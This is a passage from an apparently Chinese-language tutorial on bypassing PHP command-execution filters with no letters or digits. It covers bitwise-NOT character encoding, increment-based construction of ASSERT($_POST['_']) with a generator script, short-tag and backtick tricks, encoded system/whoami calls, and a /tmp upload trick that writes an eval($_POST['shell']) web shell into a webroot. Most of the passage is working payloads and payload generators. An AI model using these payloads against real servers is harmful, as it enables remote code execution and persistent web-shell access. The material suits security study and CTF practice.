class="string">郎诗肩房诚衬衫视话诞询该详建肃录隶居届刷屈弦承孟孤陕降限妹姑姐姓始驾参艰线练组细驶织终驻驼绍经贯奏春帮珍玻毒型挂封持项垮挎城挠政赴赵挡挺括拴拾挑指垫挣挤拼挖按挥挪</span></span><br><span class="line"><span class="string">某甚革荐巷带草茧茶荒茫荡荣故胡南药标枯柄栋相查柏柳柱柿栏树要咸威歪研砖厘厚砌砍面耐耍牵残殃轻鸦皆背战点临览竖省削尝是盼眨哄显哑冒映星昨畏趴胃贵界虹虾蚁思蚂虽品咽骂</span></span><br><span class="line"><span class="string">哗咱响哈咬咳哪炭峡罚贱贴骨钞钟钢钥钩卸缸拜看矩怎牲选适秒香种秋科重复竿段便俩贷顺修保促侮俭俗俘信皇泉鬼侵追俊盾待律很须叙剑逃食盆胆胜胞胖脉勉狭狮独狡狱狠贸怨急饶蚀</span></span><br><span class="line"><span class="string">饺饼弯将奖哀亭亮度迹庭疮疯疫疤姿亲音帝施闻阀阁差养美姜叛送类迷前首逆总炼炸炮烂剃洁洪洒浇浊洞测洗活派洽染济洋洲浑浓津恒恢恰恼恨举觉宣室宫宪突穿窃客冠语扁袄祖神祝误</span></span><br><span class="line"><span class="string">诱说诵垦退既屋昼费陡眉孩除险院娃姥姨姻娇怒架贺盈勇怠柔垒绑绒结绕骄绘给络骆绝绞统耕耗艳泰珠班素蚕顽盏匪捞栽捕振载赶起盐捎捏埋捉捆捐损都哲逝捡换挽热恐壶挨耻耽恭莲莫</span></span><br><span class="line"><span class="string">荷获晋恶真框桂档桐株桥桃格校核样根索哥速逗栗配翅辱唇夏础破原套逐烈殊顾轿较顿毙致柴桌虑监紧党晒眠晓鸭晃晌晕蚊哨哭恩唤啊唉罢峰圆贼贿钱钳钻铁铃铅缺氧特牺造乘敌秤租积</span></span><br><span class="line"><span class="string">秧秩称秘透笔笑笋债借值倚倾倒倘俱倡候俯倍倦健臭射躬息徒徐舰舱般航途拿爹爱颂翁脆脂胸胳脏胶脑狸狼逢留皱饿恋桨浆衰高席准座脊症病疾疼疲效离唐资凉站剖竞部旁旅畜阅羞瓶拳</span></span><br><span class="line"><span class="string">粉料益兼烤烘烦烧烛烟递涛浙涝酒涉消浩海涂浴浮流润浪浸涨烫涌悟悄悔悦害宽家宵宴宾窄容宰案请朗诸读扇袜袖袍被祥课谁调冤谅谈谊剥恳展剧屑弱陵陶陷陪娱娘通能难预桑绢绣验继</span></span><br><span class="line"><span class="string">球理捧堵描域掩捷排掉堆推掀授教掏掠培接控探据掘职基著勒黄萌萝菌菜萄菊萍菠营械梦梢梅检梳梯桶救副票戚爽聋袭盛雪辅辆虚雀堂常匙晨睁眯眼悬野啦晚啄距跃略蛇累唱患唯崖崭崇</span></span><br><span class="line"><span class="string">圈铜铲银甜梨犁移笨笼笛符第敏做袋悠偿偶偷您售停偏假得衔盘船斜盒鸽悉欲彩领脚脖脸脱象够猜猪猎猫猛馅馆凑减毫麻痒痕廊康庸鹿盗章竟商族旋望率着盖粘粗粒断剪兽清添淋淹渠渐</span></span><br><span class="line"><span class="string">混渔淘液淡深婆梁渗情惜惭悼惧惕惊惨惯寇寄宿窑密谋谎祸谜逮敢屠弹随蛋隆隐婚婶颈绩绪续骑绳维绵绸绿琴斑替款堪搭塔越趁趋超提堤博揭喜插揪搜煮援裁搁搂搅握揉斯期欺联散惹葬</span></span><br><span class="line"><span class="string">葛董葡敬葱落朝辜葵棒棋植森椅椒棵棍棉棚棕惠惑逼厨厦硬确雁殖裂雄暂雅辈悲紫辉敞赏掌晴暑最量喷晶喇遇喊景践跌跑遗蛙蛛蜓喝喂喘喉幅帽赌赔黑铸铺链销锁锄锅锈锋锐短智毯鹅剩</span></span><br><span class="line"><span class="string">稍程稀税筐等筑策筛筒答筋筝傲傅牌堡集焦傍储奥街惩御循艇舒番释禽腊脾腔鲁猾猴然馋装蛮就痛童阔善羡普粪尊道曾焰港湖渣湿温渴滑湾渡游滋溉愤慌惰愧愉慨割寒富窜窝窗遍裕裤裙</span></span><br><span class="line"><span class="string">谢谣谦属屡强粥疏隔隙絮嫂登缎缓编骗缘瑞魂肆摄摸填搏塌鼓摆携搬摇搞塘摊蒜勤鹊蓝墓幕蓬蓄蒙蒸献禁楚想槐榆楼概赖酬感碍碑碎碰碗碌雷零雾雹输督龄鉴睛睡睬鄙愚暖盟歇暗照跨跳</span></span><br><span class="line"><span class="string">跪路跟遣蛾蜂嗓置罪罩错锡锣锤锦键锯矮辞稠愁筹签简毁舅鼠催傻像躲微愈遥腰腥腹腾腿触解酱痰廉新韵意粮数煎塑慈煤煌满漠源滤滥滔溪溜滚滨粱滩慎誉塞谨福群殿辟障嫌嫁叠缝缠静</span></span><br><span class="line"><span class="string">碧璃墙撇嘉摧截誓境摘摔聚蔽慕暮蔑模榴榜榨歌遭酷酿酸磁愿需弊裳颗嗽蜻蜡蝇蜘赚锹锻舞稳算箩管僚鼻魄貌膜膊膀鲜疑馒裹敲豪膏遮腐瘦辣竭端旗精歉熄熔漆漂漫滴演漏慢寨赛察蜜谱</span></span><br><span class="line"><span class="string">嫩翠熊凳骡缩慧撕撒趣趟撑播撞撤增聪鞋蕉蔬横槽樱橡飘醋醉震霉瞒题暴瞎影踢踏踩踪蝶蝴嘱墨镇靠稻黎稿稼箱箭篇僵躺僻德艘膝膛熟摩颜毅糊遵潜潮懂额慰劈操燕薯薪薄颠橘整融醒餐</span></span><br><span class="line"><span class="string">嘴蹄器赠默镜赞篮邀衡膨雕磨凝辨辩糖糕燃澡激懒壁避缴戴擦鞠藏霜霞瞧蹈螺穗繁辫赢糟糠燥臂翼骤鞭覆蹦镰翻鹰警攀蹲颤瓣爆疆壤耀躁嚼嚷籍魔灌蠢霸露囊罐匕刁丐歹戈夭仑讥冗邓艾</span></span><br><span class="line"><span class="string">夯凸卢叭叽皿凹囚矢乍尔冯玄邦迂邢芋芍吏夷吁吕吆屹廷迄臼仲伦伊肋旭匈凫妆亥汛讳讶讹讼诀弛阱驮驯纫玖玛韧抠扼汞扳抡坎坞抑拟抒芙芜苇芥芯芭杖杉巫杈甫匣轩卤肖吱吠呕呐吟呛</span></span><br><span class="line"><span class="string">吻吭邑囤吮岖牡佑佃伺囱肛肘甸狈鸠彤灸刨庇吝庐闰兑灼沐沛汰沥沦汹沧沪忱诅诈罕屁坠妓姊妒纬玫卦坷坯拓坪坤拄拧拂拙拇拗茉昔苛苫苟苞茁苔枉枢枚枫杭郁矾奈奄殴歧卓昙哎咕呵咙</span></span><br><span class="line"><span class="string">呻啰咒咆咖帕账贬贮氛秉岳侠侥侣侈卑刽刹肴觅忿瓮肮肪狞庞疟疙疚卒氓炬沽沮泣泞泌沼怔怯宠宛衩祈诡帚屉弧弥陋陌函姆虱叁绅驹绊绎契贰玷玲珊拭拷拱挟垢垛拯荆茸茬荚茵茴荞荠荤</span></span><br><span class="line"><span class="string">荧荔栈柑栅柠枷勃柬砂泵砚鸥轴韭虐昧盹咧昵昭盅勋哆咪哟幽钙钝钠钦钧钮毡氢秕俏俄俐侯徊衍胚胧胎狰饵峦奕咨飒闺闽籽娄烁炫洼柒涎洛恃恍恬恤宦诫诬祠诲屏屎逊陨姚娜蚤骇耘耙秦</span></span><br><span class="line"><span class="string">匿埂捂捍袁捌挫挚捣捅埃耿聂荸莽莱莉莹莺梆栖桦栓桅桩贾酌砸砰砾殉逞哮唠哺剔蚌蚜畔蚣蚪蚓哩圃鸯唁哼唆峭唧峻赂赃钾铆氨秫笆俺赁倔殷耸舀豺豹颁胯胰脐脓逛卿鸵鸳馁凌凄衷郭斋</span></span><br><span class="line"><span class="string">疹紊瓷羔烙浦涡涣涤涧涕涩悍悯窍诺诽袒谆祟恕娩骏琐麸琉琅措捺捶赦埠捻掐掂掖掷掸掺勘聊娶菱菲萎菩萤乾萧萨菇彬梗梧梭曹酝酗厢硅硕奢盔匾颅彪眶晤曼晦冕啡畦趾啃蛆蚯蛉蛀唬唾</span></span><br><span class="line"><span class="string">啤啥啸崎逻崔崩婴赊铐铛铝铡铣铭矫秸秽笙笤偎傀躯兜衅徘徙舶舷舵敛翎脯逸凰猖祭烹庶庵痊阎阐眷焊焕鸿涯淑淌淮淆渊淫淳淤淀涮涵惦悴惋寂窒谍谐裆袱祷谒谓谚尉堕隅婉颇绰绷综绽</span></span><br><span class="line"><span class="string">缀巢琳琢琼揍堰揩揽揖彭揣搀搓壹搔葫募蒋蒂韩棱椰焚椎棺榔椭粟棘酣酥硝硫颊雳翘凿棠晰鼎喳遏晾畴跋跛蛔蜒蛤鹃喻啼喧嵌赋赎赐锉锌甥掰氮氯黍筏牍粤逾腌腋腕猩猬惫敦痘痢痪竣翔</span></span><br><span class="line"><span class="string">奠遂焙滞湘渤渺溃溅湃愕惶寓窖窘雇谤犀隘媒媚婿缅缆缔缕骚瑟鹉瑰搪聘斟靴靶蓖蒿蒲蓉楔椿楷榄楞楣酪碘硼碉辐辑频睹睦瞄嗜嗦暇畸跷跺蜈蜗蜕蛹嗅嗡嗤署蜀幌锚锥锨锭锰稚颓筷魁衙</span></span><br><span class="line"><span class="string">腻腮腺鹏肄猿颖煞雏馍馏禀痹廓痴靖誊漓溢溯溶滓溺寞窥窟寝褂裸谬媳嫉缚缤剿赘熬赫蔫摹蔓蔗蔼熙蔚兢榛榕酵碟碴碱碳辕辖雌墅嘁踊蝉嘀幔镀舔熏箍箕箫舆僧孵瘩瘟彰粹漱漩漾慷寡寥</span></span><br><span class="line"><span class="string">谭褐褪隧嫡缨撵撩撮撬擒墩撰鞍蕊蕴樊樟橄敷豌醇磕磅碾憋嘶嘲嘹蝠蝎蝌蝗蝙嘿幢镊镐稽篓膘鲤鲫褒瘪瘤瘫凛澎潭潦澳潘澈澜澄憔懊憎翩褥谴鹤憨履嬉豫缭撼擂擅蕾薛薇擎翰噩橱橙瓢蟥</span></span><br><span class="line"><span class="string">霍霎辙冀踱蹂蟆螃螟噪鹦黔穆篡篷篙篱儒膳鲸瘾瘸糙燎濒憾懈窿缰壕藐檬檐檩檀礁磷了瞬瞳瞪曙蹋蟋蟀嚎赡镣魏簇儡徽爵朦臊鳄糜癌懦豁臀藕藤瞻嚣鳍癞瀑襟璧戳攒孽蘑藻鳖蹭蹬簸簿蟹</span></span><br><span class="line"><span class="string">靡癣羹鬓攘蠕巍鳞糯譬霹躏髓蘸镶瓤矗&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mb_str_split</span>(<span class="params"> <span class="variable">$string</span> </span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_split</span>(<span class="string">&#x27;/(?&lt;!^)(?!$)/u&#x27;</span>, <span class="variable">$string</span> );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="title function_ invoke__">mb_str_split</span>(<span class="variable">$word</span>) <span class="keyword">as</span> <span class="variable">$c</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$arr</span>[] = <span class="variable">$c</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$x</span>=<span class="number">0</span>;<span class="variable">$x</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$shell</span>);<span class="variable">$x</span>++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$y</span>=<span class="number">0</span>;<span class="variable">$y</span>&lt;<span class="title function_ invoke__">count</span>(<span class="variable">$arr</span>);<span class="variable">$y</span>++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$k</span> = <span class="variable">$arr</span>[<span class="variable">$y</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$shell</span>[<span class="variable">$x</span>] == ~(<span class="variable">$k</span>&#123;<span class="number">1</span>&#125;))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$result</span> .= <span class="variable">$k</span>;</span><br><span class="line">            <span class="variable">$result1</span> .= <span class="string">&quot;%&quot;</span>.<span class="title function_ invoke__">bin2hex</span>(<span class="variable">$k</span>&#123;<span class="number">1</span>&#125;);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;字符串：&quot;</span>.<span class="variable">$result</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;URL编码：&quot;</span>.<span class="variable">$result1</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;解码后的结果 &quot;</span>.~(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$result1</span>));</span><br></pre></td></tr></table></figure>

<h3 id="三、无字母数字自增绕过"><a href="#三、无字母数字自增绕过" class="headerlink" title="三、无字母数字自增绕过"></a>三、无字母数字自增绕过</h3><p>原理：通过++来使字母变化(ascii码加1)，拿到字母A即可获取其他字符</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注意加加的顺序</span></span><br><span class="line"><span class="comment">#如何获取字母A</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$_</span>=[];</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$_</span>; <span class="comment">#输出Array（正常情况是用print_r输出数组），但是我们无法取出A</span></span><br><span class="line">	<span class="variable">$_</span>=[].<span class="string">&#x27;&#x27;</span>; <span class="comment">#变成字符串</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$_</span>[<span class="number">0</span>]; <span class="comment">#可以取出A，但是不允许数字</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$_</span>[<span class="variable">$__</span>];<span class="comment">#不存在的变量代替0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#PHP5	ASSERT($_POST[&#x27;_&#x27;]);</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$_</span>=[].<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="variable">$___</span>=<span class="variable">$_</span>[<span class="variable">$__</span>]; <span class="comment">#拿到A(3个下划线)</span></span><br><span class="line">	<span class="variable">$__</span>=<span class="variable">$___</span>; <span class="comment">#赋值$_,$__为A</span></span><br><span class="line">	++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;...(<span class="number">18</span>次)...++<span class="variable">$__</span>; <span class="comment">#得到S</span></span><br><span class="line">	<span class="comment">#之后的内容用.拼接</span></span><br><span class="line">	<span class="variable">$_</span>=<span class="variable">$_</span>.<span class="variable">$__</span>; <span class="comment">#AS</span></span><br><span class="line">	<span class="variable">$_</span>=<span class="variable">$_</span>.<span class="variable">$__</span>; <span class="comment">#ASS</span></span><br><span class="line">	<span class="comment">#拼接完一个之后，重置$__=$___=A(三下划线一直为A)</span></span><br><span class="line">	<span class="variable">$__</span>=<span class="variable">$___</span>;</span><br><span class="line">	<span class="variable">$__</span>++; <span class="variable">$__</span>++; <span class="variable">$__</span>++;<span class="variable">$__</span>++;  </span><br><span class="line">	<span class="variable">$_</span>.<span class="variable">$__</span>;<span class="comment">#ASSE</span></span><br><span class="line">	....</span><br><span class="line">     <span class="variable">$_</span> -&gt; ASSERT;</span><br><span class="line">     <span class="variable">$____</span>(<span class="number">4</span>个) -&gt; _POST; <span class="comment">#赋初始值为_</span></span><br><span class="line">	 <span class="variable">$__</span>=<span class="variable">$$____</span>; <span class="comment">#构造$_POST</span></span><br><span class="line">	 <span class="variable">$_</span>(<span class="variable">$__</span>[_]); -&gt;<span class="title function_ invoke__">ASSERT</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;_&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>构造过程用脚本</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="title function_ invoke__">strtoupper</span>(<span class="string">&#x27;ASSERT&#x27;</span>); <span class="comment">#改成你的命令,$_是cmd</span></span><br><span class="line"><span class="variable">$cmd2</span> = <span class="title function_ invoke__">strtoupper</span>(<span class="string">&#x27;POST&#x27;</span>); <span class="comment">#改成你的命令,$____是cmd2,自己进行拼接</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">POC</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="variable">$POC_pat1</span> = <span class="string">&quot;\$__=\$___;&quot;</span>;</span><br><span class="line">    <span class="variable">$POC_pat2</span> = <span class="string">&quot;\$_ .=\$__;&quot;</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$cmd</span>))&#123;</span><br><span class="line">        <span class="variable">$str1</span> = <span class="variable">$cmd</span>[<span class="variable">$i</span>];</span><br><span class="line">        <span class="variable">$POC1</span> = <span class="title function_ invoke__">base_convert</span>(<span class="title function_ invoke__">bin2hex</span>(<span class="variable">$str1</span>),<span class="number">16</span>,<span class="number">10</span>)-<span class="title function_ invoke__">base_convert</span>(<span class="title function_ invoke__">bin2hex</span>(<span class="string">&quot;A&quot;</span>),<span class="number">16</span>,<span class="number">10</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$i</span>&lt;<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="variable">$POC_pat3</span> = <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;++\$__;&quot;</span>,<span class="variable">$POC1</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$POC_pat3</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$str2</span> = <span class="variable">$cmd</span>[<span class="variable">$i</span>-<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$str1</span>==<span class="variable">$str2</span>)&#123;</span><br><span class="line">                <span class="variable">$POC_pat5</span> = <span class="variable">$POC_pat2</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$POC_pat5</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$POC_pat6</span> = <span class="variable">$POC_pat1</span>.<span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;++\$__;&quot;</span>,<span class="variable">$POC1</span>).<span class="variable">$POC_pat2</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$POC_pat6</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$i</span>++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">POC2</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;$____ = &quot;_&quot;;$__=$___;&#x27;</span>;</span><br><span class="line">    <span class="variable">$POC_pat1</span> = <span class="string">&quot;\$__=\$___;&quot;</span>;</span><br><span class="line">    <span class="variable">$POC_pat2</span> = <span class="string">&quot;\$____ .=\$__;&quot;</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$cmd</span>))&#123;</span><br><span class="line">        <span class="variable">$str1</span> = <span class="variable">$cmd</span>[<span class="variable">$i</span>];</span><br><span class="line">        <span class="variable">$POC1</span> = <span class="title function_ invoke__">base_convert</span>(<span class="title function_ invoke__">bin2hex</span>(<span class="variable">$str1</span>),<span class="number">16</span>,<span class="number">10</span>)-<span class="title function_ invoke__">base_convert</span>(<span class="title function_ invoke__">bin2hex</span>(<span class="string">&quot;A&quot;</span>),<span class="number">16</span>,<span class="number">10</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$i</span>&lt;<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="variable">$POC_pat3</span> = <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;++\$__;&quot;</span>,<span class="variable">$POC1</span>).<span class="variable">$POC_pat2</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$POC_pat3</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$str2</span> = <span class="variable">$cmd</span>[<span class="variable">$i</span>-<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$str1</span>==<span class="variable">$str2</span>)&#123;</span><br><span class="line">                <span class="variable">$POC_pat5</span> = <span class="variable">$POC_pat2</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$POC_pat5</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$POC_pat6</span> = <span class="variable">$POC_pat1</span>.<span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;++\$__;&quot;</span>,<span class="variable">$POC1</span>).<span class="variable">$POC_pat2</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$POC_pat6</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$i</span>++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$cmd</span>))&#123;</span><br><span class="line">    <span class="variable">$POC_pat7</span> = <span class="string">&quot;\$_=[].&#x27;&#x27;;\$___=\$_[\$__];\$__=\$___;\$_=\$___;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$POC_pat7</span>;</span><br><span class="line">    <span class="title function_ invoke__">POC</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$cmd2</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">POC2</span>(<span class="variable">$cmd2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/../images/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/15.png"></p>
<p>注意：url编码！！！</p>
<p>同理，php7构造<code>$_POST[_]</code>(反引号包围)</p>
<h3 id="无字母数字特殊符号过滤"><a href="#无字母数字特殊符号过滤" class="headerlink" title="无字母数字特殊符号过滤"></a>无字母数字特殊符号过滤</h3><h4 id="1-过滤下划线"><a href="#1-过滤下划线" class="headerlink" title="1.过滤下划线"></a>1.过滤下划线</h4><p>短标签法：&lt;?&#x3D;phpinfo();&gt;</p>
<h5 id="PHP-短标签"><a href="#PHP-短标签" class="headerlink" title="PHP 短标签"></a>PHP 短标签</h5><p>我们最常见的 PHP 标签就是<code>&lt;?php ?&gt;</code>了，但是 PHP 中还有两种短标签，即<code>&lt;? ?&gt;</code>和<code>&lt;?= ?&gt;</code>。当关键字 “php” 被过滤了之后，此时我们便不能使用<code>&lt;?php ?&gt;</code>了，但是我们可以用另外两种短标签进行绕过，并且在短标签中的代码不需要使用分号<code>;</code>。</p>
<p>其中，<code>&lt;? ?&gt;</code>相当于对<code>&lt;?php ?&gt;</code>的替换。而<code>&lt;?= ?&gt;</code>则是相当于<code>&lt;?php echo ... ?&gt;</code>。例如：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="string">&#x27;Hello World&#x27;</span><span class="meta">?&gt;</span>    <span class="comment">// 输出 &quot;Hello World&quot;</span></span><br></pre></td></tr></table></figure>

<p>PHP中，反引号可以直接命令执行系统命令，但是如果想要输出执行结果还需要使用 echo 等函数：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> `ls /`;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>还可以使用<code>&lt;?= ?&gt;</code>短标签（比较灵活）：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span> `ls /`<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>?&gt;&lt;?=(反引号)&#123;$&#123;~&quot;%a0%b8%ba%ab&#125;[%a0]&#125;(反引号)?&gt;</code>	-&gt;	?&gt;&lt;?&#x3D;`$_GET[‘%a0’]&#96;</p>
<p>取反绕过，%a0是下划线</p>
<p>注意，POST方法%a0不会解码，用减号[-]代替[_]</p>
<h4 id="2-过滤下划线和"><a href="#2-过滤下划线和" class="headerlink" title="2.过滤下划线和$"></a>2.过滤下划线和$</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#php7支持($a)()执行命令，(call_user_func)(system,whoami,&#x27;&#x27;);</span></span><br><span class="line">(~%<span class="number">9</span>c%<span class="number">9</span>e%<span class="number">93</span>%<span class="number">93</span>%a0%<span class="number">8</span>a%<span class="number">8</span>c%<span class="number">9</span>a%<span class="number">8</span>d%a0%<span class="number">99</span>%<span class="number">8</span>a%<span class="number">91</span>%<span class="number">9</span>c)(~%<span class="number">8</span>c%<span class="number">86</span>%<span class="number">8</span>c%<span class="number">8</span>b%<span class="number">9</span>a%<span class="number">92</span>,~%<span class="number">88</span>%<span class="number">97</span>%<span class="number">90</span>%<span class="number">9</span>e%<span class="number">92</span>%<span class="number">96</span>,<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">(<span class="string">&#x27;phpinfo&#x27;</span>)();</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#php5利用/tmp文件-&gt;php??????</span></span><br><span class="line"><span class="comment">#匹配 ./???/????????[@-[]	筛选最后一位是大写字母从@到[,8个?</span></span><br><span class="line"><span class="comment">#强制用post上传一句话木马</span></span><br><span class="line">---------<span class="number">123</span></span><br><span class="line">Content-Disposition:<span class="keyword">from</span>-data:name=<span class="string">&quot;file&quot;</span>;filename=<span class="string">&quot;1.txt&quot;</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;?php eval(\$_POST[&#x27;shell&#x27;]);&quot;</span> &gt; /www/admin/localhost_80/wwwroot/class11/success.php</span><br><span class="line">---------<span class="number">123</span>-----</span><br></pre></td></tr></table></figure>

<p>!(..&#x2F;images&#x2F;命令执行&#x2F;16.png)</p>
<p>生成一个1.txt文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=<span class="meta">?&gt;</span><span class="meta">&lt;?=</span>`.+/???/????????[@-[]`;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/../images/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/17.png"></p>
